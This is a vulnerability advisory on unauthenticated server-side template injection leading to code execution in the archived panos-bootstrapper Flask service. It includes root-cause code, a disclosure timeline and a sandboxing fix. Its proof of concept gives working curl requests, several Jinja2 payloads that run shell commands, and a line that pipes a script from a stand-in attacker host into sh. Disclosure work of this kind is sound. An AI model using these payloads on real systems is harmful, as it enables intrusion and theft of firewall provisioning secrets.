# Unauthenticated SSTI to Remote Code Execution in panos-bootstrapper

- Project: `PaloAltoNetworks/panos-bootstrapper`
- Repository: https://github.com/PaloAltoNetworks/panos-bootstrapper
- Verified commit: `8128161a2cc1f4236274ed9cb2281c873734d673` (branch `master`, HEAD at archival)
- Repository status: archived 2026-04-07 (read-only)
- Vulnerability class: CWE-1336 (SSTI), CWE-94 (code injection), CWE-306 (missing authentication)
- Authentication required: none
- Impact: remote code execution as the service account; disclosure of PAN-OS bootstrap material processed by the service
- CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical) for deployments reachable over the network
- Reporter: Daghlar Mammadov `<daghlarmammadov@gmail.com>`
- Status: vendor declined to triage (archived repository); CVE requested via GitHub Advisory Database and MITRE CNA-LR
- Discovery date: 2026-06-23
- Public disclosure date: 2026-10-02 (90-day coordinated-disclosure window elapsed 2026-09-21)

## Summary

`panos-bootstrapper` is a Flask service that produces PAN-OS NGFW bootstrap packages
over an HTTP API. Twenty-one routes are registered. None of them require
authentication, a session, an API key, or any form of authorization. Two of those
routes together form a direct SSTI primitive:

1. `POST /import_template` writes an attacker-supplied Jinja2 template to the
   application database without validation or sanitization.
2. `POST /render_template` loads that stored template and passes it to Flask's
   `render_template_string()`, which uses the default, non-sandboxed Jinja2
   environment.

A single pair of HTTP requests from an unauthenticated remote attacker executes
arbitrary code on the host. `POST /update_template` provides an equivalent chain
and additionally permits overwriting legitimate templates that administrators
later render through `/generate_bootstrap_package`.

## Dependency stack (fixed by the archived commit)

From `requirements.txt`:

```
Flask==1.0.2
Jinja2==2.10.1
Werkzeug==0.16.0
```

`Dockerfile` pins `python:3.6-alpine` and the entrypoint is:

```
CMD ["flask", "run", "--host=0.0.0.0", "--port=5000"]
```

Flask's `render_template_string()` uses the default `jinja2.Environment()` across
every Flask release, which does not sandbox attribute access on template objects.
The SSTI primitive is therefore present on every historical commit that contains
the two routes above, and not conditional on a particular Flask or Jinja2 patch
level.

## Route inventory and authentication posture

`grep -nE "@app.route|login_required|before_request|@require|@auth" bootstrapper/bootstrapper.py` on commit `8128161a`:

```
61 : @app.route('/')
70 : @app.route('/bootstrapper.swagger.json')
79 : @app.route('/get/<key>', methods=['GET'])
94 : @app.route('/set', methods=['POST'])
111: @app.route('/bootstrap_openstack', methods=['POST'])
134: @app.route('/bootstrap_kvm', methods=['POST'])
156: @app.route('/bootstrap_kvm', methods=['POST'])
178: @app.route('/bootstrap_aws', methods=['POST'])
199: @app.route('/bootstrap_azure', methods=['POST'])
221: @app.route('/bootstrap_gcp', methods=['POST'])
243: @app.route('/generate_bootstrap_package', methods=['POST'])
365: @app.route('/get_bootstrap_variables', methods=['POST'])
397: @app.route('/import_template', methods=['POST'])         <-- vector A
431: @app.route('/update_template', methods=['POST'])         <-- vector B
460: @app.route('/delete_template', methods=['POST'])
483: @app.route('/list_templates', methods=['GET'])
494: @app.route('/get_template', methods=['POST'])
509: @app.route('/list_init_cfg_templates', methods=['GET'])
515: @app.route('/render_template', methods=['POST'])         <-- sink
532: @app.route('/get_template_variables', methods=['POST'])
```

No `before_request` hook, no decorator-based gating, no session verification, no
API key check, no HTTP Basic/Digest, no mTLS, no CSRF token. The only `before_*`
hook in the file (`@app.before_first_request`) performs database initialization.
A full-codebase search for `token`, `api_key`, `session`, `login_required`,
`@auth`, `HTTPBasic` returns only data-plane uses (GCP/AWS credentials passed
through to cloud SDKs) and SQLAlchemy session bookkeeping.

## Root cause (code excerpts)

### Vector A: template import then render

`bootstrapper/bootstrapper.py:397-428`

```python
@app.route('/import_template', methods=['POST'])
def import_template():
    input_params = bootstrapper_utils.normalize_input_params(request)
    try:
        name = input_params['name']
        encoded_template = input_params['template']
        description = input_params.get('description', 'Imported Template')
        template_type = input_params.get('type', 'bootstrap')
        template = unquote(encoded_template)
    except KeyError:
        ...
    if bootstrapper_utils.import_template(template, name, description, template_type):
        return jsonify(success=True, message='Imported Template Successfully', status_code=200)
```

`bootstrapper/lib/bootstrapper_utils.py:85-105` writes the string to the
`templates` table verbatim after a cosmetic `unescape()` pass.

`bootstrapper/bootstrapper.py:515-529`

```python
@app.route('/render_template', methods=['POST'])
def render_db_template():
    try:
        input_params = bootstrapper_utils.normalize_input_params(request)
        return bootstrapper_utils.compile_template(input_params)
    except RequiredParametersError as rpe:
        abort(400, 'Not all required parameters are present in payload')
    except TemplateNotFoundError as tne:
        abort(500, 'Could not load desired template')
```

`bootstrapper/lib/bootstrapper_utils.py:594-608`

```python
def compile_template(configuration_parameters):
    if 'template_name' not in configuration_parameters:
        raise RequiredParametersError('Not all required keys for bootstrap.xml are present')

    template_name = configuration_parameters['template_name']
    required = get_required_vars_from_template(template_name)
    if not required.issubset(configuration_parameters):
        raise RequiredParametersError('Not all required keys for bootstrap.xml are present')

    template = get_template(template_name)
    if template is None:
        raise TemplateNotFoundError('Could not load %s' % template_name)

    return render_template_string(template, **configuration_parameters)
```

### Vector B: template update

`bootstrapper/bootstrapper.py:431-459` is identical in shape to `/import_template`
and dispatches to `bootstrapper_utils.edit_template()`, which replaces the row
unconditionally. An attacker can therefore substitute any pre-existing template
(for example a default bootstrap template rendered by the UI's
`/generate_bootstrap_package` flow) with a malicious payload, converting a later
administrator-driven render into code execution without requiring any attacker
POST to `/render_template` at all.

### The required-vars check does not mitigate SSTI

`get_required_vars_from_template()` at `bootstrapper/lib/bootstrapper_utils.py:241-275`:

```python
env = jinja2.Environment()
...
ast = env.parse(t.template)
template_variables = meta.find_undeclared_variables(ast)
```

`jinja2.meta.find_undeclared_variables()` returns the set of names that are
referenced in the AST and not declared by the template itself. Jinja2 built-in
globals (`cycler`, `lipsum`, `namespace`, `range`, `dict`, `joiner`, `self`) are
considered declared and therefore never appear in that set. A payload composed
exclusively of built-in globals produces an empty `required` set, and
`set().issubset(configuration_parameters)` is unconditionally `True`. The gate
never fires for an SSTI payload.

## Proof of concept

Two unauthenticated requests. First, store a Jinja2 expression that reaches
`os.popen` through the `cycler` built-in global. Second, render it.

```bash
TARGET="http://127.0.0.1:5000"

# 1. Store a hostile template. No authentication, no session, no CSRF token.
curl -sS -X POST "$TARGET/import_template" \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "name": "pwn",
    "template": "{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}",
    "description": "poc",
    "type": "bootstrap"
  }'
# -> {"message":"Imported Template Successfully","status_code":200,"success":true}

# 2. Render it. The command output is returned in the HTTP response body.
curl -sS -X POST "$TARGET/render_template" \
  -H 'Content-Type: application/json' \
  --data-binary '{"template_name":"pwn"}'
# -> uid=1000(...) gid=1000(...) groups=...
```

Alternative payloads that exercise the same code path and bypass the undeclared-
variable check in the same way:

```jinja2
{{ lipsum.__globals__.os.popen("id").read() }}
{{ namespace.__init__.__globals__.os.popen("id").read() }}
{{ joiner.__init__.__globals__.os.popen("id").read() }}
```

Statement injection also works and lets an attacker fork long-running processes
without the output needing to fit in the HTTP response:

```jinja2
{% for c in cycler.__init__.__globals__.os.popen("curl http://attacker/|sh").read() %}{% endfor %}
```

### Local validation of the Jinja2 primitive

Independent of the service, the Jinja2 primitive used by the payload resolves
cleanly:

```
$ python3 -c "
import jinja2
from jinja2 import meta
env = jinja2.Environment()
tpl = '{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}'
print('undeclared:', meta.find_undeclared_variables(env.parse(tpl)))
print('render:', env.from_string(tpl).render())
"
undeclared: set()
render: uid=1000(...) gid=1000(...) groups=...
```

`undeclared: set()` is the precise condition that the service's
`required.issubset(configuration_parameters)` check reduces to a tautology.

## Reachability and real-world exposure

Default deployment paths that expose the vulnerable surface over the network:

- Direct container run: `docker run -p 5000:5000 panos-bootstrapper` publishes
  the vulnerable API on all interfaces of the host.
- Any Compose or Kubernetes manifest that routes external traffic to port 5000
  of the backend container (search engines index deployments of this project
  under its public container tag).
- Direct `flask run --host=0.0.0.0 --port=5000` from a build environment, as
  the Dockerfile `CMD` demonstrates.

The companion `panos-bootstrapper-ui` repository ships a `docker-compose.yml`
that binds the backend to `127.0.0.1:5001`. In that specific topology the
SSTI-bearing endpoints are not remotely reachable from outside the host, and
exploitation requires either local access or a chained SSRF.

## Impact

Successful exploitation produces code execution as the service account on the
host running the container. The service by design processes PAN-OS firewall
bootstrap material (`init-cfg.txt`, `bootstrap.xml`, device license and
authentication codes, cloud bucket credentials used to stage bootstrap bundles).
Compromise of the host therefore extends to disclosure or substitution of this
material at provisioning time, with downstream consequences on devices that
subsequently consume it.

## Vendor coordination and disposition

| Date | Event |
|------|-------|
| 2026-04-07 | Repository archived by vendor; README updated with "THIS PROJECT IS NO LONGER MAINTAINED AND NOT IN USE!" banner. |
| 2026-06-23 | Report delivered to `psirt@paloaltonetworks.com`, including source references, PoC and CVSS. |
| 2026-06-23 | PSIRT auto-acknowledgement. |
| 2026-06-25 | PSIRT (handler: `mivaldi@paloaltonetworks.com`) declined to triage further, citing archived repository status, and recommended that users "avoid exposing the API to untrusted networks or discontinue use entirely". |
| 2026-09-21 | 90-day coordinated-disclosure window elapsed. |
| 2026-10-02 | Public disclosure, concurrent GitHub Advisory Database submission and MITRE CNA-LR CVE request. |

Vendor state as of 2026-10-02: no CVE assigned by Palo Alto Networks PSIRT, no
entry on `security.paloaltonetworks.com` matching this project, no GitHub
Security Advisory published on the repository, no fix commit.

## Remediation

For operators of existing deployments:

1. Treat the service as end-of-life and remove it from any network boundary.
2. If removal is not immediately possible, bind the listener to the loopback
   interface, place authentication (reverse-proxy mTLS, basic auth, mutual TLS)
   in front of it, and firewall port 5000 from all untrusted networks.
3. Audit the `templates` database table for rows whose body contains Jinja2
   expressions resolving to `__init__`, `__globals__`, `__class__`, `__mro__`,
   `__subclasses__`, `popen`, `system`, `__builtins__`, `request.application`
   or `self.__init__.__globals__`.

For a hypothetical fork:

```python
from jinja2.sandbox import SandboxedEnvironment

def compile_template(configuration_parameters):
    template_name = configuration_parameters['template_name']
    template = get_template(template_name)
    if template is None:
        raise TemplateNotFoundError('Could not load %s' % template_name)
    env = SandboxedEnvironment()
    return env.from_string(template).render(**configuration_parameters)
```

In addition: require authentication on every state-changing or rendering route,
default-bind to loopback, and document that network exposure of the API is a
supported-only-with-authentication posture.

## Credit

Vulnerability research, PoC and disclosure coordination by Daghlar Mammadov.
Reported to vendor on 2026-06-23. Disclosed publicly on 2026-10-02 after the
coordinated-disclosure window elapsed and the vendor declined to triage.
